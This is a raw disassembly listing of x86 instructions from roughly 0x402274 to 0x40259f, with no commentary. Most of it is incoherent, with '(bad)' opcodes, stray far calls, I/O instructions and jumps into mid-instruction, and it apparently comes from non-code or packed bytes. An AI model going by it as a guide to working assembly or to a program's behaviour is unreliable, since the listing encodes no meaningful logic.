  402274:	or     edi,DWORD PTR [ecx-0x8123dc]
  40227a:	(bad)  
  40227b:	(bad)  
  40227c:	out    dx,eax
  40227d:	dec    eax
  40227e:	repz ret 
  402280:	or     DWORD PTR [ebp+0xe],ebx
  402283:	pop    es
  402284:	or     DWORD PTR [ecx-0x9149af],edi
  40228a:	(bad)  
  40228b:	jmp    DWORD PTR [ebp-0x857fe9]
  402291:	jg     0x4022f5
  402293:	sub    eax,0x3c9e9551
  402298:	xchg   ecx,eax
  402299:	mov    al,ds:0xc8a739f4
  40229e:	rcl    DWORD PTR [ecx+0x1],0x48
  4022a2:	push   esp
  4022a3:	mov    DWORD PTR [edx+0x1004876],ecx
  4022a9:	dec    eax
  4022aa:	jbe    0x40223d
  4022ac:	xchg   edx,eax
  4022ad:	push   esp
  4022ae:	dec    eax
  4022af:	add    BYTE PTR [ecx],al
  4022b1:	dec    eax
  4022b2:	push   esp
  4022b3:	cdq    
  4022b4:	call   0x7048:0x1004870
  4022bb:	mov    eax,ds:0x4834a2
  4022c0:	add    DWORD PTR [eax+0x34],ecx
  4022c3:	test   eax,0x4870aa
  4022c8:	add    DWORD PTR [eax+0x70],ecx
  4022cb:	mov    cl,0xb2
  4022cd:	xor    al,0x48
  4022cf:	add    BYTE PTR [ecx],al
  4022d1:	dec    eax
  4022d2:	xor    al,0xb9
  4022d4:	mov    WORD PTR [ebp-0x255d3cef],?
  4022da:	mov    esp,0x91094dc7
  4022df:	mov    al,bh
  4022e1:	adc    dh,BYTE PTR [eax+eax*1-0x74]
  4022e5:	jge    0x40233b
  4022e7:	mov    al,BYTE PTR [ebp+0x42207b21]
  4022ed:	(bad)  
  4022ee:	je     0x4022ef
  4022f0:	add    DWORD PTR [ecx+0x3b],esp
  4022f3:	mov    BYTE PTR [eax-0x6b],ah
  4022f6:	pop    ebp
  4022f7:	mov    edx,DWORD PTR [edx-0x49]
  4022fa:	and    BYTE PTR [ebx-0x7724cf40],dh
  402300:	add    DWORD PTR [eax],edi
  402302:	inc    ebp
  402303:	mov    ecx,DWORD PTR ds:0xa9af3b00
  402309:	adc    ebx,DWORD PTR [ecx+0x5c]
  40230c:	fsub   QWORD PTR [ecx-0x34b20e4d]
  402312:	clc    
  402313:	mov    eax,DWORD PTR [ecx]
  402315:	dec    eax
  402316:	mov    cl,0xac
  402318:	popa   
  402319:	test   eax,0x8776f8c3
  40231e:	popf   
  40231f:	and    BYTE PTR ds:0xc6e90cbd,al
  402325:	sbb    BYTE PTR [eax],al
  402327:	add    BYTE PTR [ecx],al
  402329:	mov    ebp,DWORD PTR [eax-0x73]
  40232c:	jle    0x402346
  40232e:	mov    eax,DWORD PTR [eax]
  402330:	or     eax,0xa9ae3b00
  402335:	adc    ecx,DWORD PTR [ebp+0x4102b500]
  40233b:	add    eax,0x4004cedc
  402340:	or     al,0x2e
  402342:	stos   DWORD PTR es:[edi],eax
  402343:	sub    bh,BYTE PTR [eax-0x6f0c5a9c]
  402349:	inc    eax
  40234a:	sub    al,0x79
  40234c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40234d:	dec    esp
  40234e:	shl    DWORD PTR [ebx-0x33],0x83
  402352:	pusha  
  402353:	ret    
  402354:	imul   esp,DWORD PTR [eax+eax*1],0xd2310120
  40235b:	add    ch,BYTE PTR [ebx-0x64]
  40235e:	cmp    edi,edi
  402360:	test   eax,0x8dd8e114
  402365:	fsub   st,st(3)
  402367:	add    BYTE PTR [eax+0x74],ah
  40236a:	pop    ss
  40236b:	jo     0x4023a6
  40236d:	inc    edi
  40236e:	retf   
  40236f:	or     BYTE PTR [eax+0x11cc3c0],dh
  402375:	rol    BYTE PTR ds:0x4684b54b,0x54
  40237c:	add    BYTE PTR [ecx-0x6a41b3ac],bh
  402382:	mov    dh,BYTE PTR [esi-0x626a754f]
  402388:	call   0x4d24:0x351db91
  40238f:	cmc    
  402390:	push   ecx
  402391:	xchg   ebp,eax
  402392:	popa   
  402393:	ret    
  402394:	mov    ds:0xf25449ea,al
  402399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40239a:	sbb    cl,BYTE PTR [edx-0x33861654]
  4023a0:	and    al,0x0
  4023a2:	xchg   dh,al
  4023a4:	std    
  4023a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023a6:	mov    ebx,DWORD PTR [eax+esi*2]
  4023a9:	add    DWORD PTR ds:0x6130d425,ebp
  4023af:	xchg   BYTE PTR [esp+edx*1+0x50],al
  4023b3:	add    cl,dh
  4023b5:	sub    DWORD PTR [esi],esp
  4023b7:	jp     0x402378
  4023b9:	push   edx
  4023ba:	cmp    al,0x46
  4023bc:	jmp    0x14424ac
  4023c1:	pop    edx
  4023c2:	call   0x723c17df
  4023c7:	enter  0x5ef4,0xa0
  4023cb:	jbe    0x402448
  4023cd:	pop    ebx
  4023ce:	add    BYTE PTR [edi+0x58],ah
  4023d1:	or     BYTE PTR [edi+0x26],bl
  4023d4:	gs add al,bh
  4023d7:	retf   0x88bc
  4023da:	icebp  
  4023db:	sbb    eax,0xb63e6540
  4023e0:	cdq    
  4023e1:	cwde   
  4023e2:	dec    ebx
  4023e3:	out    0xed,al
  4023e5:	popa   
  4023e6:	dec    edx
  4023e7:	cmp    esp,DWORD PTR [ebp+0x16f8a81]
  4023ed:	push   0x741bab60
  4023f2:	or     BYTE PTR cs:0x12040743,cl
  4023f9:	daa    
  4023fa:	xchg   edx,eax
  4023fb:	cmp    eax,0x16947a50
  402400:	jl     0x402396
  402402:	jp     0x402455
  402404:	push   esp
  402405:	jp     0x40239b
  402407:	jl     0x402443
  402409:	stos   BYTE PTR es:[edi],al
  40240a:	test   DWORD PTR [eax+0x2],ebp
  40240d:	outs   dx,BYTE PTR ds:[esi]
  40240e:	push   ds
  40240f:	sub    ecx,DWORD PTR [edi]
  402411:	adc    bl,BYTE PTR [ecx]
  402413:	sbb    DWORD PTR [ebx],eax
  402415:	and    esi,DWORD PTR [esi]
  402417:	xchg   edi,eax
  402418:	test   eax,0xc9b6d758
  40241d:	or     al,bh
  40241f:	add    eax,0x66cb9a05
  402424:	bound  edx,QWORD PTR [esi]
  402426:	xchg   ebp,eax
  402427:	add    DWORD PTR [eax-0x59],ebx
  40242a:	push   es
  40242b:	push   ebx
  40242c:	add    eax,0xbf5a5f3a
  402431:	and    DWORD PTR [edx+0x50],ebp
  402434:	add    DWORD PTR [ebx-0x45933e6],ecx
  40243a:	cdq    
  40243b:	add    BYTE PTR [ecx],al
  40243d:	adc    ch,BYTE PTR [ebp-0x5b66a27a]
  402443:	inc    edi
  402444:	retf   
  402445:	bound  ebx,QWORD PTR [eax-0x2c]
  402448:	repnz push edx
  40244a:	jbe    0x40242f
  40244c:	ret    
  40244d:	call   0x1b4f2a4
  402452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402453:	call   FWORD PTR [eax-0x59]
  402456:	sub    DWORD PTR [edi],eax
  402458:	leave  
  402459:	loop   0x4023f6
  40245b:	push   esp
  40245c:	pop    eax
  40245d:	adc    dh,BYTE PTR [esp+eiz*8]
  402460:	ja     0x4024b7
  402462:	sar    bh,1
  402464:	pop    esi
  402465:	lea    eax,[ebp-0x12]
  402468:	hlt    
  402469:	test   DWORD PTR [ecx-0x2fdf332c],ecx
  40246f:	ficomp WORD PTR [eax+edx*1+0x24]
  402473:	inc    esp
  402474:	add    DWORD PTR [eax],eax
  402476:	add    BYTE PTR [eax+0x69],ch
  402479:	add    BYTE PTR [eax],al
  40247b:	add    ah,al
  40247d:	xor    si,si
  402480:	xchg   ecx,eax
  402481:	mov    DWORD PTR [ebx],ebp
  402483:	cdq    
  402484:	cmp    eax,0xe255dce0
  402489:	adc    ah,BYTE PTR [ebp+0x640a6ee7]
  40248f:	rol    BYTE PTR [ecx],1
  402491:	sti    
  402492:	out    dx,eax
  402493:	arpl   dx,dx
  402495:	adc    ebp,DWORD PTR [edi-0x1]
  402498:	mov    DWORD PTR [ebp+0x75],esi
  40249b:	sub    BYTE PTR [ebp-0x13],cl
  40249e:	dec    ebx
  40249f:	and    eax,0x24523716
  4024a4:	jns    0x40243f
  4024a6:	jmp    0x40251e
  4024a8:	loop   0x4024bd
  4024aa:	dec    ebp
  4024ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024ac:	xchg   ecx,eax
  4024ad:	sar    DWORD PTR [ecx+edx*4+0x554b0b6d],cl
  4024b4:	jno    0x402530
  4024b6:	sub    esp,ebx
  4024b8:	ret    
  4024b9:	sub    eax,DWORD PTR [ecx]
  4024bb:	mov    dh,0x21
  4024bd:	call   FWORD PTR [ecx-0x6bdbb010]
  4024c3:	mov    BYTE PTR [edi+0x0],ch
  4024c6:	jge    0x402463
  4024c8:	adc    DWORD PTR [eax],eax
  4024ca:	aas    
  4024cb:	outs   dx,BYTE PTR ds:[esi]
  4024cc:	imul   ebp,DWORD PTR [eax-0x5a63efab],0x7e
  4024d3:	in     al,dx
  4024d4:	jmp    0x8ccc1559
  4024d9:	cld    
  4024da:	imul   eax,DWORD PTR [eax],0xdcfc6806
  4024e0:	add    edi,edi
  4024e2:	push   ebp
  4024e3:	and    DWORD PTR [ebx+0x55],ecx
  4024e6:	xchg   edi,eax
  4024e7:	rol    DWORD PTR [ecx+0x6e000068],cl
  4024ed:	push   0x0
  4024ef:	push   0x68
  4024f1:	push   0x8001036a
  4024f6:	aas    
  4024f7:	(bad)  
  4024f8:	test   eax,0xc1c40173
  4024fd:	and    BYTE PTR [edx*2-0x4a66f3c],0x2e
  402505:	mov    ds:0x5ec06144,eax
  40250a:	(bad)  
  40250b:	aam    0x4a
  40250d:	jno    0x402541
  40250f:	into   
  402510:	bound  esp,QWORD PTR [ebp+0x76]
  402513:	aam    0x1e
  402515:	sbb    edx,DWORD PTR [ecx-0x7c]
  402518:	sub    ebp,DWORD PTR [ebp+0x52]
  40251b:	pop    edi
  40251c:	lds    edx,FWORD PTR [edx+0x27b3bc5d]
  402522:	dec    esi
  402523:	xchg   DWORD PTR [ecx+0x6e],ecx
  402526:	mov    eax,0xadfbd425
  40252b:	jns    0x4024e2
  40252d:	xchg   ebx,eax
  40252e:	adc    DWORD PTR [esi],esi
  402530:	sub    al,0x8f
  402532:	xchg   edx,eax
  402533:	lea    esi,[eax-0x5c713a9c]
  402539:	cmp    ch,dh
  40253b:	aas    
  40253c:	adc    al,0xa6
  40253e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40253f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402540:	lea    esp,[edi-0x3ad51cf8]
  402546:	add    al,0xd7
  402548:	jnp    0x402507
  40254a:	push   ds
  40254b:	clc    
  40254c:	xchg   DWORD PTR [ebx+0x12602],edx
  402552:	add    BYTE PTR [edi+0x1],dh
  402558:	add    DWORD PTR [eax],eax
  40255a:	add    BYTE PTR [eax],al
  40255c:	add    DWORD PTR [eax],eax
  40255e:	add    BYTE PTR [eax],al
  402560:	add    DWORD PTR [eax],eax
  402562:	add    BYTE PTR [eax],al
  402564:	add    DWORD PTR [eax],eax
  402566:	add    BYTE PTR [eax],al
  402568:	add    DWORD PTR [edx+0x72],ebp
  40256b:	add    BYTE PTR [ecx],al
  40256d:	jb     0x4025b9
  40256f:	add    eax,0x42004
  402574:	add    DWORD PTR [edi+0x7b27347b],eax
  40257a:	add    DWORD PTR [eax],0x30
  40257d:	icebp  
  40257e:	ja     0x402525
  402580:	repz mov ecx,0xd2315133
  402586:	cli    
  402587:	dec    edi
  402588:	jno    0x402526
  40258a:	adc    ecx,DWORD PTR [ecx-0x22]
  40258d:	retf   
  40258e:	pop    esi
  40258f:	cmc    
  402590:	mov    ch,0xd
  402592:	inc    eax
  402593:	cwde   
  402594:	push   0xffffffbb
  402596:	in     eax,0x3b
  402598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402599:	adc    dl,BYTE PTR [eax-0x2bc80b07]
  40259f:	pop    edi
